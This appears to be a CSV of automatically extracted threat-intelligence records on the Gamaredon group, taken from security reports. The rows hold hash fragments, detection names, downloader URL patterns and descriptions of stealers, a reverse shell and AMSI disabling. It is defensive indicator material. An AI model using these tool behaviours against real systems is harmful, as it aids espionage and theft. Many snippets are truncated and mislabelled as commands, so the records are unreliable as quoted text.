1.0.0,actor--gamaredon,artifact--sha256:34c0ba395c6def9e7b60c4f49f192ed614324208dba332d34321be6c87bdb879,observation--sha256:9622761260b507da2359c24b8a20c07b91ac36f170224dfad04dabc9a88bed4b,command,B392E0B5502DB50DE768 N/A PowerShell/Pterodo.GA Downloader of PteroPShell.,B392E0B5502DB50DE768 N/A PowerShell/Pterodo.GA Downloader of PteroPShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:b321442bce82473b14064e354fdaa6f77baef6b08a2ee96a0e27014b3dd21d8d,observation--sha256:e5f2dc4527c94d891bf12347dd57fdd5e65b7456b9ca6d349c746a399b8cce42,command,B5CCA883658397FFBEDF N/A PowerShell/Agent.GT PteroPSLoad – PowerShell,B5CCA883658397FFBEDF N/A PowerShell/Agent.GT PteroPSLoad – PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:5b661c37ef9d7c1434c3755d44e9d7cfd2a2a030b6e6e9f7be9f13079f4d66c5,observation--sha256:e927f61a42e58aaee8654c45ecbbef216acc63c9f8f477bdacb7bdfce77f3eda,command,B7105DEC8B21B9D9749E N/A PowerShell/Pterodo.GN PowerShell version of PteroLNK – USB,B7105DEC8B21B9D9749E N/A PowerShell/Pterodo.GN PowerShell version of PteroLNK – USB,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,40 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 945A50678E6E9AA29370 7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo ader.Agent.GBK Downloader of PteroGram. AB7C5C7CD6F75B1D0A7A D29176A254055BE5356E N/A VBS/Pterodo.SC Downloader of PowerSh ell version of PteroLNK. 866E874CFF4EAD298899 24AA02630E68AE252B55 N/A VBS/Pterodo.SL Downloader of the VBScript version of PteroLNK. 49CF239AB2EBD04CAFDC EC07FBB0C1C1A43E8C,
1.0.0,actor--gamaredon,artifact--sha256:75bee5a2a0aec176503391e275bcdd2742d3083e4a3146716d2c6fb2f4189462,observation--sha256:08a09b4a2a934871471ffd4396edf087c7ff49b7673a8ccf346d08893f31d2ef,command,BA2366ED4E83FFC6DEC489C9011FE181CE169A47 ) is a PowerShell scree n-capturing tool that takes,BA2366ED4E83FFC6DEC489C9011FE181CE169A47 ) is a PowerShell scree n-capturing tool that takes,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"28 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 PteroScreen First seen by ESET Research in July 2022, PteroScreen (SHA-1: BA2366ED4E83FFC6DEC489C9011FE181CE169A47 ) is a PowerShell scree n-capturing tool that takes screenshots of all screens and temporarily stores the image in %TEMP% \<randomNumber>.png . The screenshot is then base64 encoded and uploaded to the C&C server along with the system drive ’s volume serial number via an HTTP POST reques",
1.0.0,actor--gamaredon,artifact--sha256:2554504eb9baadb5d33aa25a67ef7a316676c2530de4d05f0da3786251fbff66,observation--sha256:b28bc3a419cded3d2c298f0ccbd4b939d8f856c6e7f25fc3673d5d5b96f68d2b,command,BC12844E2B587622643A N/A PowerShell/Pterodo.GC PteroClone – uses rclone to download,BC12844E2B587622643A N/A PowerShell/Pterodo.GC PteroClone – uses rclone to download,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"39 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IOCS Files In this section, w e only provide one example for each tool or variant . All IoCs were already provided in the MISP events published with private ESET Threat Intelligence reports throughout 2022 and 2023. SHA-1 Filename Detection Description DF1C0A70E7A02B839AB3 AAC3FC410E61EEFB58EB N/A VBS/Pterodo.AEV PteroX – a VBScript general -purpose downloader. B50F10BBDB49BE6D868B 09F3E1DD6C78D58D8E",
1.0.0,actor--gamaredon,artifact--sha256:b5d83c62e28e16213086db7e95b7f8fd2960f430e196522b052d2f8dc6db4a9b,observation--sha256:4fb24018a281fe7e6050afc606e2aae442d9d9b44b380e1bcd663cb40cee800f,command,BF2E8782057E2F83C2DF N/A PowerShell/KillAV.AH PteroSocks – SOCKS proxy.,BF2E8782057E2F83C2DF N/A PowerShell/KillAV.AH PteroSocks – SOCKS proxy,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,42 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 2B9B0AD0B65BB6101704 684CD339E946FAE2DCFA N/A VBS/Pterodo.ABV PteroSand – a VBScript general - purpose downloader. 2416DFC031CF0D05054D 5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO PteroScout – gathers and exfiltrates various information about the compromis ed system. 8C79BB8EB97E774FFCEC 66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout. B,
1.0.0,actor--gamaredon,artifact--sha256:6e9c2356d555afcb01d7bf4fa5287900256d4a337e2091294803001ac13ef88c,observation--sha256:da6cc1192dba585174050490991e60abec3c2b1109ad959420b34d3cedd1cbde,command,BIOS manufacturer/serial number retrieved via the following PowerShell methods:,BIOS manufacturer/serial number retrieved via the following PowerShell methods:,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"22 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances PteroBox PteroBox is a known Gamaredon file stealer that we discovered at the end of 2024, and detailed in our Gamaredon 2024 white paper. During 2025, we discovered a new variant of PteroBox that uses the rclone utility to exfiltrate files to Dropbox; therefore, we named it the rclone variant. The API variant, as we now call the original variant, has been updated a few times throughout 2025, and both variants have ",
1.0.0,actor--gamaredon,artifact--sha256:783ef7ba0a6a5d28f652653d4d2d6a9aefae7126d564a6d0e613ca4edadbce66,observation--sha256:5adb60e91a01fe2a6dea5195f65d13f161fcf1b2c77954caf56c89570f2df081,command,C:\WINDOWS\system32\WindowsPowerShell \v1.0\powershell.exe as their target and a newly added,C:\WINDOWS\system32\WindowsPowerShell \v1.0\powershell.exe as their target and a newly added,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"25 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 For both vari ants, we have only seen PteroDash being used as a downloader component of PteroTemplate. PteroDig PteroDig (SHA -1: 1AEAE7A567C71200BA804801C4CEC227D2B64414 ), which we discovered in November 2022, is a PowerShell tool that weaponizes selected Desktop LNK files. It drops a basic skeleton of a downloader to %USERPROFILE% and stores relevant parts of the downloader script in the registry ",
1.0.0,actor--gamaredon,artifact--sha256:fcb89f542eb055dc510970143c9497dd71412973858808f881c0310c6c61bd5f,observation--sha256:740b51d40e1c3ea4dbf2ccc741b260c1a62c567b752fbf4f289afb23c7afa32c,command,CA2BD27BE54E86DA75C N/A PowerShell/Pterodo.QD PteroPSLoad – PowerShell,CA2BD27BE54E86DA75C N/A PowerShell/Pterodo.QD PteroPSLoad – PowerShell,candidate,2025-11-20T00:00:00Z,day,known,same-record,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"31 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances SHA -1 Filename Detection Description F718F25DCCF68BD7CB28A A7CB526FFA54B0E51A8 N/A PowerShell/TrojanDownloa der.Agent.LDD Downloader of PteroPSDoor. 09A22856890AB6AEF6311 CA2BD27BE54E86DA75C N/A PowerShell/Pterodo.QD PteroPSLoad – PowerShell downloader. 0F952E6162BCC881F7F84 4F3E2C7CDA9A5C74D72 N/A PowerShell/Pterodo.SU PteroPSLoad – PowerShell downloader. 61B03FF9D84EB653F9F66 867DBF76DFB1E130E93 N/A PowerShell/Pt",
1.0.0,actor--gamaredon,artifact--sha256:01f855bee29c90e2ea45bbbe55b09115c6b994d75dc168db1ed5dbdffc535b8a,observation--sha256:8c387662585327dc6d737f87231624a57d1de68a40d10ab362546d2e7e70ce6d,command,CD5C67A98336C4BF9504 N/A PowerShell/Pterodo.DX PteroPSLoad – PowerShell,CD5C67A98336C4BF9504 N/A PowerShell/Pterodo.DX PteroPSLoad – PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:b292a9c577ea0b8c0344e8206205d6a428340ef3e19677e8c25cbc6ef44856e0,observation--sha256:37c846d84cf1ab5bad24cc069828b3103e28baf24c24bd40808571f948fc9d9f,command,D027BEB24AE0DC864F7F N/A VBS/Pterodo.CAQ PteroDee – downloads PowerShell,D027BEB24AE0DC864F7F N/A VBS/Pterodo.CAQ PteroDee – downloads PowerShell,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"30 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances After a break in January 2025, Gamaredon resumed running frequent spearphishing campaigns, with notably higher activity in the second half of the year , during which Gamaredon also slightly tweaked its TTPs, and started exploiting a vulnerability affecting WinRAR ( CVE-2025-8088) to deploy its typical malicious HTA downloaders . Lastly, Gamaredon continued with its efforts to protect and hide its network infrastruct",
1.0.0,actor--gamaredon,artifact--sha256:267af70c71d42e4b3664bdc86c85bf183a092fcb78ff9add058fb42c20188459,observation--sha256:9b42ad0203ec3dfe89a831ba8b6e1018d485f05132b7c103980b80e8b51fd4da,command,D0FDC6A1BBD91D57E75D N/A PowerShell/TrojanDownlo,D0FDC6A1BBD91D57E75D N/A PowerShell/TrojanDownlo,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,42 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 2B9B0AD0B65BB6101704 684CD339E946FAE2DCFA N/A VBS/Pterodo.ABV PteroSand – a VBScript general - purpose downloader. 2416DFC031CF0D05054D 5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO PteroScout – gathers and exfiltrates various information about the compromis ed system. 8C79BB8EB97E774FFCEC 66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout. B,
1.0.0,actor--gamaredon,artifact--sha256:fd2d2d787c51af0498fa7df58ac6bc5f0df8cb7d62f19d034ff08490959da067,observation--sha256:687f5a8e2a2bf2a91bd2f1519e14644a1247d810eed93924793ce08d7880b40b,command,Downloader February 2025 PowerShell,Downloader February 2025 PowerShell,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"7 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances TOOLSET In 2025, Gamaredon developed six new custom tools, but also continued using and updating many of its tools that we described in our two previous white papers, which detailed the group’s activities in 2 022– 2023 and 2024. The programming languages of choice for developing the se new tools remain PowerShell and VBScript : all Gamaredon tools mentioned in this white paper are written in one of these programming",
1.0.0,actor--gamaredon,artifact--sha256:5d0c776df073408142cc207f14f781bc8d4023b9aa9f0dc5b201721c6c302be9,observation--sha256:3eef50019f1a7f30cea1a2e3c061145d8476f64e311a68944f891800d479e5bc,command,Downloader of the PowerShell version of,Downloader of the PowerShell version of,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,17 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Table 3. URL patterns as sociated with dedicated downloaders Associated URL patterns Downloader of PteroPShell http://<IP>/cmd http://<IP>/scripts/cmd.txt http://<IP>/test/cmd.txt Downloader of PteroBleed http://<IP>/scripts/web.txt http://<IP>/test/web.txt Downloader of PteroClone http://<IP>/test/copy.txt Downloader of PteroCookie http://<IP>/cookies http://<IP>/scripts/cookies.txt http://<IP>/admi,
1.0.0,actor--gamaredon,artifact--sha256:0fb6dcecbc34632b5ad8d555a66ada5b7ab787a853339870835767879a95d427,observation--sha256:5ddc695143637e3e4114037bfd79b80edd9fd9591e08bf148b65e1d0548480a2,command,E113F41C36E4F2C464B6 N/A PowerShell/Pterodo.GS PteroPSDoor variant 1 version 7208.,E113F41C36E4F2C464B6 N/A PowerShell/Pterodo.GS PteroPSDoor variant 1 version 7208,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,40 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 945A50678E6E9AA29370 7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo ader.Agent.GBK Downloader of PteroGram. AB7C5C7CD6F75B1D0A7A D29176A254055BE5356E N/A VBS/Pterodo.SC Downloader of PowerSh ell version of PteroLNK. 866E874CFF4EAD298899 24AA02630E68AE252B55 N/A VBS/Pterodo.SL Downloader of the VBScript version of PteroLNK. 49CF239AB2EBD04CAFDC EC07FBB0C1C1A43E8C,
1.0.0,actor--gamaredon,artifact--sha256:28bb625db88c27bcf6dacf39b07852dcd4cec6d05c8fa5648b777637dc5547b5,observation--sha256:a23770bee543a783a36f571b81ad0e4c02d65ce4326e1008baadb3e693a339fc,command,E2FEEE0B92819AC7FCA85CFE3DC37750834F0990 ) is a very simple reverse shell written in PowerShell. It,E2FEEE0B92819AC7FCA85CFE3DC37750834F0990 ) is a very simple reverse shell written in PowerShell. It,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"31 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 ° OS version, ° original install date, ° system boot time, ° system type, ° system directory, ° logon server, ° domain, ° total physical memory, and ° available physical memory. · used and free space of all connected drives, · a list of running processes, · a list of installed applications enumerated from two registry keys: ° HKLM\Software\Microsoft \Windows\CurrentVersion \Uninstall\ , and ° HKCU\So",
1.0.0,actor--gamaredon,artifact--sha256:39595943ed0757a5bcd92886fa406e0206de85647a362872de15b0f6fa79bd2e,observation--sha256:e2debd15cc773fcd4e88142654ea39ebd570c10448e7c398e26888f88b43dccb,command,EAF5B58A8B91858CF4D5 N/A Win32/Pterodo.BTM PteroPSLoad – PowerShell,EAF5B58A8B91858CF4D5 N/A Win32/Pterodo.BTM PteroPSLoad – PowerShell,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,41 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 025E3D88C53FC12D5A4A AB726E696F2815BAC84D N/A VBS/Pterodo.TX PteroPSLoad – PowerShell downloader. D5576E578518E474A5DF F654C44AB3EC4A6E4ECF N/A PowerShell/Pterodo.FD PteroPSLoad – PowerShell downloader. 28F4F0367C2BB0574C8A 7D1B9C3E71E6AC678300 N/A PowerShell/Pterodo.AV PteroPSLoad – PowerShell downloader. E0BD8855159CB708789C 4DE183E107C5C117FBA1 N/A PowerShell/P,
1.0.0,actor--gamaredon,artifact--sha256:372e20789c1cc0826c25576d2199844725a145f7988d199cc808b88fcc562159,observation--sha256:fc5693ed22448f0eed21d95d0a9c6901f0b54431058c74c8c4d4275c904e93d2,command,EC07FBB0C1C1A43E8C02 N/A PowerShell/Pterodo.FC PowerShell version of PteroLNK – USB,EC07FBB0C1C1A43E8C02 N/A PowerShell/Pterodo.FC PowerShell version of PteroLNK – USB,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,40 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 945A50678E6E9AA29370 7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo ader.Agent.GBK Downloader of PteroGram. AB7C5C7CD6F75B1D0A7A D29176A254055BE5356E N/A VBS/Pterodo.SC Downloader of PowerSh ell version of PteroLNK. 866E874CFF4EAD298899 24AA02630E68AE252B55 N/A VBS/Pterodo.SL Downloader of the VBScript version of PteroLNK. 49CF239AB2EBD04CAFDC EC07FBB0C1C1A43E8C,
1.0.0,actor--gamaredon,artifact--sha256:53914767683a79e01456a9761afb9613de4daba6977f0af6ed132edea7674f7f,observation--sha256:a8d8b328ea1d5c446e155c645f0420a390fb90413590b7646d6d007cdb0cced3,command,EF4517B9ADB60C73CA80 N/A PowerShell/Pterodo.JJ Downloader of PteroPSDoor variant 1.,EF4517B9ADB60C73CA80 N/A PowerShell/Pterodo.JJ Downloader of PteroPSDoor variant 1,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,40 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 945A50678E6E9AA29370 7E4F41E9BC81B9098BC5 N/A PowerShell/TrojanDownlo ader.Agent.GBK Downloader of PteroGram. AB7C5C7CD6F75B1D0A7A D29176A254055BE5356E N/A VBS/Pterodo.SC Downloader of PowerSh ell version of PteroLNK. 866E874CFF4EAD298899 24AA02630E68AE252B55 N/A VBS/Pterodo.SL Downloader of the VBScript version of PteroLNK. 49CF239AB2EBD04CAFDC EC07FBB0C1C1A43E8C,
1.0.0,actor--gamaredon,artifact--sha256:0ad689393add32fd8e801ef4a2203af4323948cf305fd2753f80790518d9cc2d,observation--sha256:9dde984ccac910bc7f6e31f70a8e56294e23095da6f31accf128604a6aa74f1f,command,"Even if the last payload is Powershell Script, VBScript or a PE File; it is trying to be","Even if the last payload is Powershell Script, VBScript or a PE File; it is trying to be",candidate,,unknown,unknown,not-stated,,source--gamaredon--a0d52e16421d8b11,Gamaredon/Beyond_Bullets_and_Bombs_An_Examination_of_Armageddon_Groups_Cyber.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Beyond Bullets and Bombs: An Examination of Armageddon Group's Cyber Warfare Against Ukraine 10 Persistence Even if the last payload is Powershell Script, VBScript or a PE File; it is trying to be persistent. In the example, malicious PE is using the registry RUN key. IOCs TYPE IOC HASH 139547707f38622c67c8ce2c026bf32052edd4d344f03a0b37895b5de016641a HASH 139547707f38622c67c8ce2c026bf32052edd4d344f03a0b37895b5de016641a HASH d282519a5f0134e5a3db91702a4aa3b1322081b42a50147d30d9e6deab0d8321 HASH 9f",
1.0.0,actor--gamaredon,artifact--sha256:40a893f56fa5d61f4bff27f3da78151280f5187560d3d7e245aea3bd986b0379,observation--sha256:399fe3de1e73f123915da0df901ea7eaf753806bc424f94a07ce7e1ca10b05d4,command,Execution: Mshta,Execution: Mshta,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 50}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,49 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Tactic ID Name Description T1564.001 Hide Artifacts: Hidden Files and Directories PteroLNK creates hidden files. T1562.001 Impair Defenses: Disable or Modify Tools PteroSocks disables AMSI by calling the method AmsiUtils.Uninitialize . T1070.004 Indicator Removal: File Deletion PteroPSDoor deletes staged files after successful exfiltration. T1036.004 Masquerading: Masquerade Task or Service Gamaredon,
1.0.0,actor--gamaredon,artifact--sha256:40a893f56fa5d61f4bff27f3da78151280f5187560d3d7e245aea3bd986b0379,observation--sha256:65870d821e459e2ebdb339e2e1831dacb65546befb822a6c707a83501167b9ac,command,Execution: Mshta,Execution: Mshta,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"37 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Tactic ID Name Description T1027.015 Obfuscated Files or Information: Compression Gamaredon uses, in its spearphishing campaigns, bzip2 -compressed HTA files, and HTA files packed in ZIP and RAR archives. T1027.016 Obfuscated Files or Information: Junk Code Insertion Gamaredon inserts junk code into its malicious tools. T1684.001 Social Engineering: Impersonation Gamaredon sends spearphishing emails impersonating Uk",
1.0.0,actor--gamaredon,artifact--sha256:cbcce196795f767b1e6bdf87c9bb7ed0ecee439c731faf462720f4af229df5b6,observation--sha256:6f26fe2447e90f4e17d8c983548839db0dc9364aca7051f82c702c7f90dbd400,command,Execution: Rundll32,Execution: Rundll32,candidate,,unknown,unknown,not-stated,,source--gamaredon--9d4f2351eb5fd5c0,Gamaredon/Technical report Armagedon.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,HKCU\Software\Microsoft\Office\<versio n>\<product>\Security\AccessVBOM T1036 Masquerading Group places components into Windows folder with names mimicking common system services or drivers T1221 Template Injection DOCX files contain a request body to download malicious DOT document templates T1497 .002 Virtualization/Sandbox Evasion Malware pings for DNS servers and checks for launched processes. Also try to identify sandbox name and compare it with hardcoded namelist T1218 .011 Signed Binary P,
1.0.0,actor--gamaredon,artifact--sha256:cbcce196795f767b1e6bdf87c9bb7ed0ecee439c731faf462720f4af229df5b6,observation--sha256:e90c614b4d97e597f01a76049c3713b4540d5eb04178d0c67b632ed19e0534da,command,Execution: Rundll32,Execution: Rundll32,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"37 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Tactic ID Name Description T1027.015 Obfuscated Files or Information: Compression Gamaredon uses, in its spearphishing campaigns, bzip2 -compressed HTA files, and HTA files packed in ZIP and RAR archives. T1027.016 Obfuscated Files or Information: Junk Code Insertion Gamaredon inserts junk code into its malicious tools. T1684.001 Social Engineering: Impersonation Gamaredon sends spearphishing emails impersonating Uk",
1.0.0,actor--gamaredon,artifact--sha256:8ecb0f0f690245f1dc4ad80479fb925cf929779bb4585ddbe839954468da4882,observation--sha256:bd117473d984626f775d6f630bb9d133a601b86a06c7b92fa1c3b78d0b51e731,command,F05874C1B908FDEF4B9AF2B084E3D813595A12C9 ) is a PowerShell infostealer that steals cookie files,F05874C1B908FDEF4B9AF2B084E3D813595A12C9 ) is a PowerShell infostealer that steals cookie files,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"29 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 If it finds any profile with a saved password, it exfiltrates the data from the following registry values of this key: · Account Name · Email · IMAP Server · IMAP Port · IMAP User · SMTP Port · SMTP Server It also exfiltrates the IMAP Password from the registry, but this data is first decrypted before exfiltration by using [System.Security.Cryptography.ProtectedData]::Unprotect . PteroCookie Discover",
1.0.0,actor--gamaredon,artifact--sha256:76c3f42a540c4f0df6c08088c48147dd8c80c569a436d454bf49ea7cc57f11f4,observation--sha256:9a834f9f77c40844fd5f4e8203512e903c756c645d84a67bebad84a6a279572d,command,F24DD6A05709F4848CB6 N/A PowerShell/Pterodo.FR PteroSig – steals database that,F24DD6A05709F4848CB6 N/A PowerShell/Pterodo.FR PteroSig – steals database that,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,42 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 SHA-1 Filename Detection Description 2B9B0AD0B65BB6101704 684CD339E946FAE2DCFA N/A VBS/Pterodo.ABV PteroSand – a VBScript general - purpose downloader. 2416DFC031CF0D05054D 5BEB9739CBA6470FE585 N/A PowerShell/Pterodo.GO PteroScout – gathers and exfiltrates various information about the compromis ed system. 8C79BB8EB97E774FFCEC 66C64F5CC8A11ED6C693 N/A PowerShell/Pterodo.GL Downloader of PteroScout. B,
1.0.0,actor--gamaredon,artifact--sha256:f4917aed7ac74b93e3c49a91ea32f1cc3330fd731f758c951a50b6cbdc12228b,observation--sha256:10b6b404d6cc40c1148ec5bba594bf41d34dadaee6bbd310dd0004492c75b190,command,F2B084E3D813595A12C9 N/A PowerShell/Pterodo.FY PteroCookie – cookie stealer.,F2B084E3D813595A12C9 N/A PowerShell/Pterodo.FY PteroCookie – cookie stealer,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"39 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 IOCS Files In this section, w e only provide one example for each tool or variant . All IoCs were already provided in the MISP events published with private ESET Threat Intelligence reports throughout 2022 and 2023. SHA-1 Filename Detection Description DF1C0A70E7A02B839AB3 AAC3FC410E61EEFB58EB N/A VBS/Pterodo.AEV PteroX – a VBScript general -purpose downloader. B50F10BBDB49BE6D868B 09F3E1DD6C78D58D8E",
